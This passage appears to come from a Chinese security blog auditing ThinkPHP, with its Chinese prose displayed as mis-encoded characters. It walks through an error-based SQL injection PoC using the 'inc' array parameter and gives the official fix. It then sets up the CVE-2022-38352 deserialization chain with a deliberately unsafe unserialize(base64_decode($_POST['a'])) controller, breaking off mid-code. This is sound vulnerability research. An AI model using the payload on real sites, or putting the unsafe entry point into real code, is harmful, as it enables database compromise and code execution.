<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">                <span class="k">switch</span> <span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;exp&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;inc&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;+&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;dec&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;-&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œä¼šåŒ¹é…<code>val[0]</code>çš„å€¼ï¼Œå€¼çš„èµ‹äºˆæ˜¯å‰é¢æåˆ°äº†çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœä¼ å‚å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[0]=1&amp;username[1]=2
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆè¿™é‡Œçš„valçš„å€¼å°±æ˜¯åŒ…å«åˆ°1å’Œ2ä¸¤ä¸ªå€¼çš„æ•°ç»„ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œï¼Œå¯ä»¥å°è¯•ä¼ å‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username[0]=exp&amp;username[1]=fupanc
</span></span></code></pre></td></tr></table>
</div>
</div><p>å†çœ‹çœ‹æƒ…å†µå‘¢ï¼Œè¿˜æ˜¯è¿›ä¸å»ï¼Œè¿™é‡Œè¾“å‡ºä¸ºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041940822.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304194048785"
	
	
></p>
<p>åœ¨expåé¢ä¼¼ä¹å¤šäº†ä¸€ä¸ªç©ºæ ¼ï¼Œphpstorrmçš„é—®é¢˜ï¼Ÿ</p>
<p>é‚£ä¹ˆåœ¨ç½‘é¡µä¸Šä¼ å‚è¯•è¯•å‘¢ï¼Œè¿˜æ˜¯ä¸è¡Œå‘¢ã€‚</p>
<p>é‚£ä¹ˆæœ€åå†è°ƒè¯•ä¸€ä¸‹POCï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸‹åˆå®Œå…¨æ­£ç¡®äº†ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041944450.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304194441413"
	
	
></p>
<p>è¿™ã€‚ã€‚ã€‚</p>
<p>é‚£å°±çœ‹è¿™ä¸ªå§ï¼Œåœ¨caseä¸­åˆ©ç”¨åˆ°çš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;inc&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;+&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„parseKey()å‡½æ•°æœ€åå…¶å®è¿”å›çš„å°±æ˜¯ä¼ è¿›å»çš„å€¼ï¼Œè€Œfloatval()å‡½æ•°åˆ™æ˜¯å°†å…¶è½¬æ¢ä¸ºæµ®ç‚¹å‹ï¼Œæœ€åç›¸åŠ ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041949158.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304194945119"
	
	
></p>
<p>è¿”å›çš„resultä¸ä¸ºç©ºäº†ï¼Œå›åˆ°insert()å‡½æ•°ï¼Œç„¶åè°ƒç”¨äº†array_keyså’Œarray_valueså‡½æ•°æ¥åˆ†åˆ«ç”Ÿæˆkeyå’Œvalueçš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯å‰é¢resultä¸­çš„å€¼ï¼Œç„¶åè¿›è¡Œäº†æ›¿æ¢æ“ä½œï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$fields</span> <span class="o">=</span> <span class="nx">array_keys</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$values</span> <span class="o">=</span> <span class="nx">array_values</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="s1">&#39;%INSERT%&#39;</span><span class="p">,</span> <span class="s1">&#39;%TABLE%&#39;</span><span class="p">,</span> <span class="s1">&#39;%FIELD%&#39;</span><span class="p">,</span> <span class="s1">&#39;%DATA%&#39;</span><span class="p">,</span> <span class="s1">&#39;%COMMENT%&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$replace</span> <span class="o">?</span> <span class="s1">&#39;REPLACE&#39;</span> <span class="o">:</span> <span class="s1">&#39;INSERT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseTable</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">],</span> <span class="nv">$options</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39; , &#39;</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39; , &#39;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseComment</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;comment&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">            <span class="p">],</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">insertSql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$sql</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åçš„sqlè¯­å¥ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">username</span><span class="o">`</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="w"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åæˆåŠŸæ‰§è¡Œï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041955280.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304195557242"
	
	
></p>
<p>æˆåŠŸè¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503041957316.png"
	
	
	
	loading="lazy"
	
		alt="image-20250304195746275"
	
	
></p>
<p>â€”â€”â€”â€”â€”â€”</p>
<h4 id="ä¿®å¤æ–¹æ¡ˆ">ä¿®å¤æ–¹æ¡ˆ
</h4><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ¡ˆæ˜¯ä¿®æ”¹switchè¯­å¥çš„é€»è¾‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">                <span class="k">switch</span> <span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;inc&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;+&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;dec&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseKey</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;-&#39;</span> <span class="o">.</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$val</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;exp&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$result</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="æ€»ç»“">æ€»ç»“
</h4><p>ç¬¬ä¸€æ¬¡å®¡ä¸‹æ¥ï¼Œç¡®å®ä»£ç å®¡è®¡éœ€è¦æ¯”è¾ƒç»†å¿ƒå‘€ï¼Œæœ‰äº›æ—¶å€™å°±æ˜¯ä¸€äº›ä¼ å‚å°±èƒ½è¾¾åˆ°æ³¨å…¥çš„æ•ˆæœï¼Œè¿˜æœ‰éœ€è¦æ³¨æ„ä»£ç ä¹‹é—´çš„è”ç³»ï¼Œæœ‰äº›æ—¶å€™åœ¨ä»£ç çš„ååŠæ®µä¼šæœ‰æ¯”è¾ƒé‡è¦çš„ä»£ç é€»è¾‘ä½“ç°ï¼Œè¿˜æ˜¯å¤šåŠ æ³¨æ„ã€‚</p>
<h3 id="thinkphp-v6013ååºåˆ—åŒ–æ¼æ´">Thinkphp v6.0.13ååºåˆ—åŒ–æ¼æ´
</h3><p>CVE-2022-38352</p>
<h4 id="ç¯å¢ƒæ­å»º-1">ç¯å¢ƒæ­å»º
</h4><p>å’Œä¹‹å‰æœ‰ç‚¹ä¸ä¸€æ ·äº†ï¼Œthinkphp6ä»¥ä¸Šå°±åªæœ‰ä½¿ç”¨composeræ¥å®‰è£…äº†ï¼Œæ¯”å¦‚è¿™é‡Œçš„ä½¿ç”¨æ–¹æ³•æ˜¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">composer</span> <span class="err">create-project</span> <span class="err">topthink/think=</span><span class="mf">6.0</span><span class="err">.</span><span class="mi">13</span> <span class="err">think</span><span class="mf">-6.0</span><span class="err">.</span><span class="mi">13</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ç®€å•è§£æä¸€ä¸‹ï¼Œè¿™é‡Œå°±æ˜¯æŒ‡å®šäº†thinkphpçš„ç‰ˆæœ¬ï¼Œç„¶åè¿™é‡Œçš„tp6å°±æ˜¯å°†æºç ä¸‹è½½åœ¨å½“å‰ç›®å½•çš„tp6ç›®å½•ä¸‹
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¦‚æœæœ‰æŠ¥é”™çš„è¯ä¸€èˆ¬å°±æ˜¯php.inié…ç½®æ–‡ä»¶æœ‰äº›é…ç½®éœ€è¦ä¿®æ”¹ï¼Œæ¯”å¦‚éœ€è¦å¼€å¯zipçš„é…ç½®ç­‰ï¼Œå…¶å®é—®AIéƒ½èƒ½é—®å‡ºæ¥ã€‚</p>
<p>ç„¶åè®¿é—®ç½‘ç«™çš„<code>public/index.php</code>ï¼Œå¦‚æœæŠ¥é”™<code>Your Composer dependencies require a PHP version â€œï¼= 7.4.0</code>ï¼Œé‚£ä¹ˆå°±éœ€è¦æ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &#34;config&#34;:{
</span></span><span class="line"><span class="cl">        &#34;platform-check&#34;: false
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ­¤æ—¶æ­å»ºæˆåŠŸï¼Œä½†æ˜¯ä¼šå‘ç°ç‰ˆæœ¬ä¸å¯¹ï¼Œæ‰€ä»¥éœ€è¦</p>
<p>è¿˜æ˜¯æ”¹é…ç½®ï¼Œåœ¨frameworkè¿™é‡Œç›´æ¥æŒ‡å®šç‰ˆæœ¬ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;require&#34;: {
</span></span><span class="line"><span class="cl">        &#34;php&#34;: &#34;&gt;=7.2.5&#34;,
</span></span><span class="line"><span class="cl">        &#34;topthink/framework&#34;: &#34;6.0.13&#34;,
</span></span><span class="line"><span class="cl">        &#34;topthink/think-orm&#34;: &#34;^2.0&#34;
</span></span><span class="line"><span class="cl">    },
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå†ä½¿ç”¨<code>composerr update</code>å³å¯ï¼Œæœ€åæˆåŠŸæ­å»ºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051231680.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305123146630"
	
	
></p>
<p>ä¸‹è½½æ¥çš„æºç å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„phpç‰ˆæœ¬è¦æ±‚æ˜¯å¤§äºç­‰äº7.2.5çš„ï¼Œè¿™é‡Œè¿˜æ˜¯ç›´æ¥ä½¿ç”¨å‰é¢çš„7.3.4å³å¯ã€‚</p>
<p>ç„¶ååœ¨<code>app\controller\Index.php</code>æ–‡ä»¶ä¸­åŠ ä¸Šå…¥å£ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">app\controller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">app\BaseController</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Index</span> <span class="k">extends</span> <span class="nx">BaseController</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&lt;style type=&#34;text/css&#34;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: &#34;Century Gothic&#34;,&#34;Microsoft yahei&#34;; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style=&#34;padding: 24px 48px;&#34;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V&#39;</span> <span class="o">.</span> <span class="nx">\think\facade\App</span><span class="o">::</span><span class="na">version</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;&lt;br/&gt;&lt;span style=&#34;font-size:30px;&#34;&gt;16è½½åˆå¿ƒä¸æ”¹ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&lt;/span&gt;&lt;/p&gt;&lt;span style=&#34;font-size:25px;&#34;&gt;[ V6.0 ç‰ˆæœ¬ç”± &lt;a href=&#34;https://www.yisu.com/&#34; target=&#34;yisu&#34;&gt;äº¿é€Ÿäº‘&lt;/a&gt; ç‹¬å®¶èµåŠ©å‘å¸ƒ ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&#34;text/javascript&#34; src=&#34;https://e.topthink.com/Public/static/client.js&#34;&gt;&lt;/script&gt;&lt;think id=&#34;ee9b1aa918103c4fc&#34;&gt;&lt;/think&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">hello</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;ThinkPHP6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;hello,&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="ä»£ç å®¡è®¡åˆ†æ">ä»£ç å®¡è®¡åˆ†æ
</h4><p>ååºåˆ—åŒ–ï¼Œä¸€èˆ¬éƒ½æ˜¯ä»<code>__destruct</code>æˆ–è€…<code>__wakeup</code>å…¥æ‰‹çš„ï¼Œè¿™é‡Œè¿˜æ˜¯ä»<code>__destruct</code>æ–¹æ³•å…¥æ‰‹ï¼Œç›´æ¥å…¨å±€æœç´¢è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¦‚ä¸‹å‡ ä¸ªé€»è¾‘ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051407735.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305140718668"
	
	
></p>
<p>æœåˆ°äº†å¦‚ä¸Šå‡ ä¸ªæ–¹æ³•ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰å¦‚ä¸‹çš„ä¸¤ä¸ªç‚¹å¯èƒ½å­˜åœ¨åˆ©ç”¨ï¼š</p>
<p>League\Flysystem\Cached\Storage\AbstractCache  ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">autosave</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>think\Model ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazySave</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹å‚è€ƒæ–‡ç« çš„å…¥æ‰‹ç‚¹æ˜¯AbstractCacheæŠ½è±¡ç±»çš„æ–¹æ³•ï¼Œæ‰€ä»¥å°±æ˜¯ç¬¬äºŒä¸ªdestruct()æ–¹æ³•ï¼Œç®€å•è·Ÿä¸€ä¸‹ã€‚</p>
<p><code>lazySave</code>å°±æ˜¯ç±»çš„ä¸€ä¸ªå˜é‡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å¯ä»¥èµ‹å€¼ä¸ºä»»æ„å€¼ï¼Œè·Ÿè¿›è°ƒç”¨çš„save()æ–¹æ³•ï¼Œè¿™é‡Œçš„AbstractCacheç±»æ˜¯æŠ½è±¡ç±»ï¼Œæ‰€ä»¥æ˜¯å¿…ç„¶æœ‰save()æ–¹æ³•çš„å®ç°äº†ï¼ŒAbstractCacheç±»çš„å®ç°ç±»æœ‰å¦‚ä¸‹å‡ ä¸ªï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503051433021.png"
	
	
	
	loading="lazy"
	
		alt="image-20250305143357955"
	
	
></p>
<p>è¿™é‡Œçš„é“¾å­æ˜¯éœ€è¦è°ƒç”¨åˆ°League\Flysystem\Cached\Storage\Psr6Cacheçš„save()æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
